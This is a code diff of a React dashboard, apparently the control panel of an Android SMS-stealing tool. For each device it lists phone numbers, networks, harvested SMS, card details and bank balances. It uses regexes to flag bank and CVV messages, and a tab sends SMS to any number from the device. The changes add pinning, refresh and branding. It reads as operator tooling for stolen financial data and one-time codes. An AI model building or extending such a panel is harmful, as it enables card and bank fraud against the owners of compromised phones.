+              return <Row key={i} label={`Phone #${i+1}`} value={p} mono color={isPinned?"#f472b6":"#a5f3fc"} delay={0.22+i*0.03}
+                trailing={<button onClick={()=>togglePinNum(p)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>}
+              />;
+            })}
           </>}
           {ana.networks.length>0&&ana.networks.map((n,i)=><Row key={i} label={`Network #${i+1}`} value={n} color="#c084fc" delay={0.3+i*0.03}/>)}
         </div>}
@@ -1047,7 +1247,17 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
             </div>
           : ana.cards.map((c,i)=><CardInfo key={i} card={c} delay={i*0.06}/>)}
         </div>}
-        {tab==="sms"&&<div style={{padding:"14px 16px",display:"flex",flexDirection:"column",gap:8}}>
+        {tab==="sms"&&<div style={{display:"flex",flexDirection:"column",height:"100%"}}>
+          <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",padding:"10px 16px",borderBottom:"1px solid var(--border)",gap:10,flexWrap:"wrap"}}>
+            <div style={{display:"flex",alignItems:"center",gap:8}}>
+              <span style={{fontSize:11,color:"var(--muted)"}}>{msgs.length} messages</span>
+              {pinnedMsgs.length>0&&<span className="badge" style={{background:"rgba(244,114,182,.1)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",fontSize:9}}>{Ic.pin(9)} {pinnedMsgs.length} pinned</span>}
+            </div>
+            <button onClick={()=>loadMsgs(false)} disabled={refreshing} className="btn btn-cyan" style={{padding:"7px 12px",fontSize:11}}>
+              {refreshing?<><span className="spin sm"/>Loading…</>:<>{Ic.refresh(12)} Refresh</>}
+            </button>
+          </div>
+          <div style={{flex:1,overflowY:"auto",padding:"14px 16px",display:"flex",flexDirection:"column",gap:8}}>
           {loading ? <div style={{textAlign:"center",padding:"50px 20px"}}>
               <span className="spin" style={{display:"inline-block",marginBottom:10}}/>
               <p style={{fontSize:12,color:"var(--muted)"}}>Loading messages…</p>
@@ -1056,23 +1266,29 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
               <span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.msg(38)}</span>
               <p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>No messages</p>
             </div>
-          : msgs.map((m,i)=>{
+          : sortedMsgs.map(({m,i,k},idx)=>{
               const isBank = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text);
               const isCard = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(m.text);
+              const isPinned = pinnedMsgs.includes(k);
               const accent = isCard?"#c084fc":isBank?"#34d399":"#f43f5e";
               const bg = isCard?"rgba(192,132,252,.06)":isBank?"rgba(52,211,153,.06)":"rgba(244,63,94,.05)";
-              return <div key={i} className="pop a-in" style={{animationDelay:`${Math.min(i*0.02,0.4)}s`,padding:12,borderRadius:12,border:"1px solid var(--border)",borderLeft:`3px solid ${accent}`,background:bg}}>
-                <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:6}}>
-                  <div style={{display:"flex",alignItems:"center",gap:6}}>
-                    <span style={{fontSize:12,fontWeight:700,color:accent}}>{m.sender}</span>
+              return <div key={k+idx} className="pop a-in" style={{animationDelay:`${Math.min(idx*0.015,0.35)}s`,padding:12,borderRadius:12,border:`1px solid ${isPinned?"rgba(244,114,182,.4)":"var(--border)"}`,borderLeft:`3px solid ${isPinned?"#f472b6":accent}`,background:isPinned?"linear-gradient(135deg,rgba(244,114,182,.08),transparent)":bg}}>
+                <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:6,gap:8}}>
+                  <div style={{display:"flex",alignItems:"center",gap:6,minWidth:0}}>
+                    {isPinned&&<span style={{color:"#f472b6",display:"flex"}}>{Ic.pin(10)}</span>}
+                    <span style={{fontSize:12,fontWeight:700,color:isPinned?"#f472b6":accent,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{m.sender}</span>
                     {isBank&&<span style={{color:"rgba(52,211,153,.8)",display:"flex"}}>{Ic.rupee(11)}</span>}
                     {isCard&&<span style={{color:"rgba(192,132,252,.8)",display:"flex"}}>{Ic.card(11)}</span>}
                   </div>
-                  <span className="mono" style={{fontSize:9,color:"var(--muted-2)"}}>{m.time}</span>
+                  <div style={{display:"flex",alignItems:"center",gap:6,flexShrink:0}}>
+                    <span className="mono" style={{fontSize:9,color:"var(--muted-2)"}}>{m.time}</span>
+                    <button onClick={()=>togglePinMsg(k)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}} title={isPinned?"Unpin":"Pin"}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>
+                  </div>
                 </div>
                 <p style={{fontSize:11,color:"var(--text)",lineHeight:1.5,opacity:.85}}>{m.text.substring(0,250)}</p>
               </div>
             })}
+          </div>
         </div>}
         {tab==="send"&&<div style={{padding:"18px 20px",display:"flex",flexDirection:"column",gap:16}}>
           <div>
@@ -1083,7 +1299,10 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
           </div>
           <div>
             <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Recipient</p>
-            <input className="inp mono" value={to} onChange={e=>setTo(e.target.value)} placeholder="+919876543210"/>
+            <input className="inp mono" value={to} onChange={e=>setTo(e.target.value)} placeholder="+919876543210" inputMode="tel" autoComplete="off"/>
+            {pinnedNums.length>0&&<div style={{display:"flex",gap:6,flexWrap:"wrap",marginTop:8}}>
+              {pinnedNums.map((n,i)=><button key={i} onClick={()=>setTo(n)} className="badge" style={{background:"rgba(244,114,182,.08)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",cursor:"pointer"}}>{Ic.pin(9)} {n}</button>)}
+            </div>}
           </div>
           <div>
             <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Message</p>
@@ -1140,7 +1359,6 @@ function BankCard({balance,delay=0}){
     </div>}
   </div>;
 }
-
 function CardInfo({card,delay=0}){
   const [show,setShow] = useState(false);
   return <div className="pop a-in" style={{animationDelay:`${delay}s`,padding:14,borderRadius:14,background:"linear-gradient(135deg,rgba(192,132,252,.08),rgba(192,132,252,.02))",border:"1px solid rgba(192,132,252,.28)",borderLeft:"3px solid rgba(192,132,252,.7)"}}>
@@ -1239,7 +1457,7 @@ function MergedView({onLogout}){
 
   async function shareAll(){
     const link = makeMergeLink(accounts);
-    try{if(navigator.share){await navigator.share({title:"eLight merged panels",url:link});toast("Merged link shared.");}
+    try{if(navigator.share){await navigator.share({title:BRAND+" merged panels",url:link});toast("Merged link shared.");}
       else{await navigator.clipboard.writeText(link);toast("Merged link copied.");}
     }catch(e){if(e?.name==="AbortError") return;
       try{await navigator.clipboard.writeText(link);toast("Merged link copied.");}catch{toast("Unable to share.");}}
@@ -1250,7 +1468,7 @@ function MergedView({onLogout}){
       <div style={{maxWidth:1400,margin:"0 auto",padding:"12px 22px",display:"flex",alignItems:"center",gap:14,flexWrap:"wrap"}}>
         <div style={{display:"flex",alignItems:"center",gap:10,flexShrink:0}}>
           <div style={{width:34,height:34,borderRadius:11,background:"linear-gradient(135deg,#8b5cf6,#22d3ee)",display:"flex",alignItems:"center",justifyContent:"center",boxShadow:"0 8px 22px rgba(139,92,246,.5)"}}>{Ic.zap(16)}</div>
-          <span className="grad-text" style={{fontWeight:700,fontSize:17}}>eLight</span>
+          <span className="grad-text" style={{fontWeight:700,fontSize:15}}>{BRAND}</span>
           <span className="badge" style={{background:"rgba(34,211,238,.1)",borderColor:"rgba(34,211,238,.3)",color:"#a5f3fc"}}>MERGED</span>
         </div>
         <div style={{position:"relative",flex:1,minWidth:200,maxWidth:380}}>
@@ -1320,14 +1538,14 @@ function MergedView({onLogout}){
 function CursorGlow(){
   const el = useRef(null);
   useEffect(()=>{
-    let x=0,y=0,tx=0,ty=0,raf;
+    let x=-500,y=-500,tx=-500,ty=-500,raf;
     const move = e=>{tx=e.clientX;ty=e.clientY;};
     const loop = ()=>{
-      x += (tx-x)*0.15; y += (ty-y)*0.15;
-      if(el.current) el.current.style.transform = `translate(${x}px,${y}px) translate(-50%,-50%)`;
+      x += (tx-x)*0.18; y += (ty-y)*0.18;
+      if(el.current) el.current.style.transform = `translate3d(${x}px,${y}px,0)`;
       raf = requestAnimationFrame(loop);
     };
-    window.addEventListener("mousemove",move);
+    window.addEventListener("mousemove",move,{passive:true});
     raf = requestAnimationFrame(loop);
     return ()=>{window.removeEventListener("mousemove",move);cancelAnimationFrame(raf);};
   },[]);
